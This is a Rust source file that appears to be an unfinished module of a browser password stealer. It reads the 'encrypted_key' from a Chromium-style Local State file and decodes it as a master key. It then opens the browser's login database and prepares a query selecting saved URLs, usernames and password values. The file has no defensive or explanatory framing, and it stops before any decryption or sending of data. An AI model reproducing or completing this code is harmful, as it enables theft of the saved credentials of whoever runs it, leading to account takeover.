extern crate aes_gcm;
extern crate sqlite3;

use sqlite3::Connection;
use sqlite3::State;
use sqlite3::Statement;

use crate::file::{get_local_state_path, read_file_to_string, base64_decode, get_db_path};

pub fn parse_master_string(data: String) -> String
{
    let mut secret_key = String::new();
    if let Some(mut idx) = data.find("encrypted_key") {
        idx += 16;
        let data_chars = data.chars().collect::<Vec<char>>();

        while idx < data_chars.len() && data_chars[idx] != '\"' {
            secret_key.push(data_chars[idx]);
            idx += 1;
        }
    }
    return secret_key
}


pub fn get_master_key() -> String
{
    let local_state_file = get_local_state_path();
    let state_file_data = read_file_to_string(local_state_file);
    let master_key = parse_master_string(state_file_data);

    return base64_decode(master_key)
    
}

pub fn parse_database_file()
{
    let select_query = "SELECT origin_url, action_url, username_value, password_value FROM logins";
    let db_path = get_db_path();
    let connection = sqlite3::open(db_path).unwrap();

    //connection.execute(select_query).unwrap();
    let mut statement = connection.prepare(select_query);
    
   
}